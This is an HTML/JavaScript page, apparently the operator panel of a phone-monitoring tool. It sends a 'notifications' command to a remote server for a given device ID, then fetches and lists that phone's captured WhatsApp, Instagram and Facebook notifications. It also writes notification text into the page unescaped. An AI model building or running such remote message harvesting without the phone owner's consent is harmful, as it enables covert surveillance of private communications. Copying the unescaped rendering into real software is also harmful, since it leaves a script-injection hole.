<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notifications - Device Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
            --whatsapp: #25D366;
            --instagram: #E1306C;
            --facebook: #1877F2;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            width: 100%; max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            height: 90vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 10px; padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
            flex-shrink: 0;
        }

        /* Status Bar (Newly Added like Contacts) */
        #apiStatus {
            background: rgba(0, 243, 255, 0.05);
            font-size: 11px; padding: 8px; border-radius: 12px;
            margin-bottom: 10px; border-left: 3px solid #00f3ff;
            color: #00f3ff; font-family: monospace;
            flex-shrink: 0;
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; display: flex; align-items: center; justify-content: center;
            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
        }

        .page-title { font-weight: bold; font-size: 1.1rem; }

        .refresh-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border); color: white;
            width: 35px; height: 35px; border-radius: 50%; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
        }

        .filters {
            display: flex; gap: 8px; overflow-x: auto; 
            padding-bottom: 10px; margin-bottom: 10px;
            scrollbar-width: none; flex-shrink: 0;
        }
        .filters::-webkit-scrollbar { display: none; }

        .filter-chip {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; color: #ccc;
            white-space: nowrap; cursor: pointer; transition: 0.3s;
        }
        .filter-chip.active {
            background: var(--accent); color: white; border-color: var(--accent); font-weight: bold;
        }

        .notif-list {
            display: flex; flex-direction: column; gap: 10px;
            overflow-y: auto;
            padding-right: 5px;
            flex-grow: 1;
        }

        .notif-list::-webkit-scrollbar { width: 4px; }
        .notif-list::-webkit-scrollbar-thumb { background: #444; border-radius: 10px; }

        .notif-card {
            background: var(--glass-bg); padding: 12px;
            border-radius: 15px; display: flex; align-items: flex-start;
            border: 1px solid var(--glass-border);
            animation: fadeIn 0.3s ease-in;
        }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .icon-box {
            width: 40px; height: 40px;
            background: #333;
            border-radius: 12px; display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; margin-right: 12px; flex-shrink: 0;
        }

        .whatsapp-icon { background: rgba(37, 211, 102, 0.2); color: var(--whatsapp); border: 1px solid var(--whatsapp); }
        .insta-icon { background: rgba(225, 48, 108, 0.2); color: var(--instagram); border: 1px solid var(--instagram); }
        .fb-icon { background: rgba(24, 119, 242, 0.2); color: var(--facebook); border: 1px solid var(--facebook); }

        .content { flex: 1; overflow: hidden; }
        
        .row-top { display: flex; justify-content: space-between; margin-bottom: 2px; }
        .sender { font-size: 0.9rem; font-weight: bold; color: #fff; }
        .time { font-size: 0.7rem; color: var(--text-muted); }
        
        .message { 
            font-size: 0.85rem; color: #ccc; 
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis; 
        }

    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Notifications</span>
            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-sync"></i></button>
        </div>

        <div id="apiStatus">Waiting for input...</div>

        <div class="filters">
            <div class="filter-chip active" onclick="filterList('all', this)">All</div>
            <div class="filter-chip" onclick="filterList('whatsapp', this)">WhatsApp</div>
            <div class="filter-chip" onclick="filterList('instagram', this)">Instagram</div>
            <div class="filter-chip" onclick="filterList('facebook', this)">Facebook</div>
            <div class="filter-chip" onclick="filterList('others', this)">Others</div>
        </div>

        <div class="notif-list" id="notifContainer">
            <div style="text-align: center; color: #666; margin-top: 50px;">Loading data...</div>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        
        const storageKey = `notifs_${DEVICE_ID}`;
        const statusEl = document.getElementById("apiStatus");
        let allData = [];

        // --- INIT ---
        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                setStatus("Error: Device ID missing!", true);
                return;
            }
            setStatus(`ID: ${DEVICE_ID} | Ready`);
            
            // 1. Purana Data Dikhao (Local Storage)
            loadFromStorage();
            
            // 2. Naya Data Mango
            handleRefresh();
        });

        // --- FUNCTIONS ---

        function setStatus(msg, isError = false) {
            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
            statusEl.style.borderColor = isError ? "#ff4444" : "#00f3ff";
            statusEl.innerHTML = `ðŸ“¡ ${msg}`;
        }

        function loadFromStorage() {
            const saved = localStorage.getItem(storageKey);
            if (saved) {
                allData = JSON.parse(saved);
                renderList(allData);
            }
        }

        function handleRefresh() {
            const btn = document.getElementById("refreshBtn");
            btn.querySelector('i').classList.add('fa-spin');
            
            // Step 1: Send Command to Phone
            sendCommand();

            // Step 2: Fetch Data (Thoda ruk ke taaki phone upload kar de)
            setStatus("Syncing with phone...");
            setTimeout(fetchData, 3000); 
        }

        function sendCommand() {
            // Server ko bolo phone se data maange
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
            }).then(res => res.json())
              .then(d => console.log("Command Sent:", d))
              .catch(e => console.error("Command Error:", e));
        }

        function fetchData() {
            const btn = document.getElementById("refreshBtn");
            const API_URL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`;

            fetch(API_URL)
                .then(res => res.json())
                .then(data => {
                    btn.querySelector('i').classList.remove('fa-spin');
                    
                    if (!data || data.length === 0) {
                        setStatus("No new notifications found.");
                        // Agar list khali hai aur purana data nahi hai toh message dikhao
                        if(allData.length === 0) {
                            document.getElementById("notifContainer").innerHTML = 
                                "<div style='text-align: center; color: #666; margin-top: 20px;'>No notifications yet.<br><small>Try refreshing again.</small></div>";
                        }
                        return;
                    }

                    // Data mil gaya
                    setStatus(`Updated: ${data.length} notifications received.`);
                    allData = data;
                    localStorage.setItem(storageKey, JSON.stringify(data));
                    
                    // Filter check karke render karo
                    const activeFilterBtn = document.querySelector('.filter-chip.active');
                    const filterType = activeFilterBtn ? activeFilterBtn.innerText.toLowerCase() : 'all';
                    // Mapping 'All' text to 'all' keyword
                    filterList(filterType === 'all' ? 'all' : filterType, activeFilterBtn);
                })
                .catch(err => {
                    btn.querySelector('i').classList.remove('fa-spin');
                    setStatus("Connection Error!", true);
                });
        }

        function renderList(data) {
            const container = document.getElementById("notifContainer");
            container.innerHTML = "";

            if (!data || data.length === 0) {
                container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No data available.</div>";
                return;
            }

            // Data ko reverse karein (Newest First)
            data.slice().reverse().forEach(item => {
                const appName = (item.appName || "System").toLowerCase();
                const title = item.title || "Unknown";
                const text = item.text || "Notification";
                
                // Icon Logic
                let iconClass = '';
                let iconHtml = '<i class="fa-solid fa-bell"></i>';

                if (appName.includes("whatsapp")) {
                    iconClass = 'whatsapp-icon';
                    iconHtml = '<i class="fa-brands fa-whatsapp"></i>';
                } else if (appName.includes("instagram")) {
                    iconClass = 'insta-icon';
                    iconHtml = '<i class="fa-brands fa-instagram"></i>';
                } else if (appName.includes("facebook")) {
                    iconClass = 'fb-icon';
                    iconHtml = '<i class="fa-brands fa-facebook-f"></i>';
                }

                // Time Logic
                let timeDisplay = "";
                if (item.postTime) {
                    let d = new Date(parseInt(item.postTime));
                    if(!isNaN(d.getTime())) {
                        timeDisplay = `${d.getHours()}:${d.getMinutes().toString().padStart(2, '0')}`;
                    }
                }

                container.innerHTML += `
                    <div class="notif-card">
                        <div class="icon-box ${iconClass}">
                            ${iconHtml}
                        </div>
                        <div class="content">
                            <div class="row-top">
                                <span class="sender">${title}</span>
                                <span class="time">${timeDisplay}</span>
                            </div>
                            <div class="message">${text}</div>
                        </div>
                    </div>`;
            });
        }

        function filterList(type, element) {
            // Visual active update
            if(element) {
                document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
                element.classList.add('active');
            }

            let filterKey = type.toLowerCase();
            
            if (filterKey === 'all') {
                renderList(allData);
            } else {
                const filtered = allData.filter(item => 
                    (item.appName || "").toLowerCase().includes(filterKey)
                );
                renderList(filtered);
            }
        }
    </script>
</body>
</html>
